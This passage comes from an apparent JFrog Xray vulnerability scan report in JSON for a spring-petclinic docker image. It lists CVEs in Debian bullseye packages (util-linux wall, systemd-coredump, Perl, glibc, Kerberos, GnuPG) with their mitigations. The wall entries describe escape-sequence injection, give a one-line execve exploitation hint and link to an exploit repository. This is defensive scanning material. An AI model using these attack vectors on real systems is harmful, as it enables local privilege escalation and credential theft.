               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libblkid1",
         "source_id": "deb://debian:bullseye:libblkid1",
         "source_comp_id": "deb://debian:bullseye:libblkid1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-596193",
         "severity": "Unknown",
         "jfrog_severity": "Low",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libmount1",
         "source_id": "deb://debian:bullseye:libmount1",
         "source_comp_id": "deb://debian:bullseye:libmount1:2.36.1-8+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:util-linux",
            "vulnerable_versions": [
               "< 2.36.1-8+deb11u2"
            ],
            "fixed_versions": [
               "2.36.1-8+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28085"
                  }
               ],
               "description": "wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-596193",
            "VulnerabilityTitle": "Wall-Escape",
            "ShortDescription": "Escape character injection in util-linux wall may allow for data leakage by local attackers in specific scenarios.",
            "FullDescription": "[util-linux](https://github.com/util-linux/util-linux) is a random collection of Linux utilities. \nwall (write all) allows a user to send a text message to all other users (terminals) in the system.\nIt was discovered that wall does not filter escape sequences from command line arguments, allowing a local user to inject escape characters into other users' terminals.\n\nThis vulnerability can be used in a per-target social engineering attack, where the local attacker injects seemingly innocent text to other users' terminals, making them write sensitive information (ex. their password) which can subsequently be leaked to local files, depending on the exact scenario.\n\nWhile an example PoC demonstrated the possibility to leak user passwords when the victim uses `sudo`, in reality exploitation of this issue requires the attacker to deeply research the affected system and requires the victim's interaction, making it difficult to exploit even in low volumes.",
            "Impact": 4,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Deployment mitigations\n\nDisable write access of other users to your terminal -\n```bash\nmesg n\n```\n\n##### Deployment mitigations\n\nRemove the setgid permissions from wall -\n```bash\nsudo chmod g-s `which wall`\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `wall` executable must have `setgid` permissions in order to be vulnerable. In addition, the victim's terminal must accept messages from other terminals (controlled via the `mesg` utility).",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
                  "Description": "The injected escape characters may allow the local attacker to social engineer a victim on the same machine. The impact of exploiting the vulnerability depends on what actions are performed by the victim user, but in most cases will lead to local privilege escalation of the attacker.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploiting the issue requires the user to interact with the vulnerable software",
                  "Description": "The victim must interact with the injected escape characters in some way to cause code execution or data leakage. The injected escape characters cannot cause any harm on their own, only assist the attacker with social engineering.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue is trivial to exploit and does not require a published writeup or PoC",
                  "Description": "A local attacker can simply call `exec` with `wall`, supplying escape characters in `argv` -\n```c\nexecve(\"/usr/bin/wall\", argv, envp);\n```",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Exploit demonstrating password leakage by local attackers using social engineering",
                  "Url": "https://github.com/skyler-ferrante/CVE-2024-28085",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Technical Writeup",
                  "Title": "Technical writeup",
                  "Url": "https://people.rit.edu/sjf5462/6831711781/wall_2_27_2024.txt",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28085",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-702944",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.\n\nA SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libsystemd0",
         "source_id": "deb://debian:bullseye:libsystemd0",
         "source_comp_id": "deb://debian:bullseye:libsystemd0:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-4598"
                  }
               ],
               "description": "A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.  A SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-4598",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-702944",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.\n\nA SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-4598"
                  }
               ],
               "description": "A vulnerability was found in systemd-coredump. This flaw allows an attacker to force a SUID process to crash and replace it with a non-SUID binary to access the original's privileged process coredump, allowing the attacker to read sensitive data, such as /etc/shadow content, loaded by the original process.  A SUID binary or process has a special type of permission, which allows the process to run with the file owner's permissions, regardless of the user executing the binary. This allows the process to access more restricted data than unprivileged users or processes would be able to. An attacker can leverage this flaw by forcing a SUID process to crash and force the Linux kernel to recycle the process PID before systemd-coredump can analyze the /proc/pid/auxv file. If the attacker wins the race condition, they gain access to the original's SUID process coredump file. They can read sensitive content loaded into memory by the original binary, affecting data confidentiality.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-4598",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-699908",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Perl threads have a working directory race condition where file operations may target unintended paths.\n\nIf a directory handle is open at thread creation, the process-wide current working directory is temporarily changed in order to clone that handle for the new thread, which is visible from any third (or more) thread already running. \n\nThis may lead to unintended operations such as loading code or accessing files from unexpected locations, which a local attacker may be able to exploit.\n\nThe bug was introduced in commit 11a11ecf4bea72b17d250cfb43c897be1341861e and released in Perl version 5.13.6",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:perl-base",
         "source_id": "deb://debian:bullseye:perl-base",
         "source_comp_id": "deb://debian:bullseye:perl-base:5.32.1-4+deb11u2",
         "component_versions": {
            "id": "debian:bullseye:perl",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-40909"
                  }
               ],
               "description": "Perl threads have a working directory race condition where file operations may target unintended paths.  If a directory handle is open at thread creation, the process-wide current working directory is temporarily changed in order to clone that handle for the new thread, which is visible from any third (or more) thread already running.   This may lead to unintended operations such as loading code or accessing files from unexpected locations, which a local attacker may be able to exploit.  The bug was introduced in commit 11a11ecf4bea72b17d250cfb43c897be1341861e and released in Perl version 5.13.6",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-40909",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-699026",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u13"
            ],
            "fixed_versions": [
               "2.31-13+deb11u13"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-4802"
                  }
               ],
               "description": "Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-4802",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-699026",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u13"
            ],
            "fixed_versions": [
               "2.31-13+deb11u13"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-4802"
                  }
               ],
               "description": "Untrusted LD_LIBRARY_PATH environment variable vulnerability in the GNU C Library version 2.27 to 2.38 allows attacker controlled loading of dynamically shared library in statically compiled setuid binaries that call dlopen (including internal dlopen calls after setlocale or calls to NSS functions such as getaddrinfo).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-4802",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-692909",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u7"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-3576"
                  }
               ],
               "description": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-3576",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-692909",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libkrb5support0:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u7"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-3576"
                  }
               ],
               "description": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-3576",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-692909",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libkrb5-3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u7"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-3576"
                  }
               ],
               "description": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-3576",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-692909",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libk5crypto3:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u7"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u7"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-3576"
                  }
               ],
               "description": "A vulnerability in the MIT Kerberos implementation allows GSSAPI-protected messages using RC4-HMAC-MD5 to be spoofed due to weaknesses in the MD5 checksum design. If RC4 is preferred over stronger encryption types, an attacker could exploit MD5 collisions to forge message integrity codes. This may lead to unauthorized message tampering.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-3576",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-677883",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In GnuPG before 2.5.5, if a user chooses to import a certificate with certain crafted subkey data that lacks a valid backsig or that has incorrect usage flags, the user loses the ability to verify signatures made from certain other signing keys, aka a \"verification DoS.\"",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:gpgv",
         "source_id": "deb://debian:bullseye:gpgv",
         "source_comp_id": "deb://debian:bullseye:gpgv:2.2.27-2+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:gnupg2",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2025-30258"
                  }
               ],
               "description": "In GnuPG before 2.5.5, if a user chooses to import a certificate with certain crafted subkey data that lacks a valid backsig or that has incorrect usage flags, the user loses the ability to verify signatures made from certain other signing keys, aka a \"verification DoS.\"",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2025-30258",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-670075",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
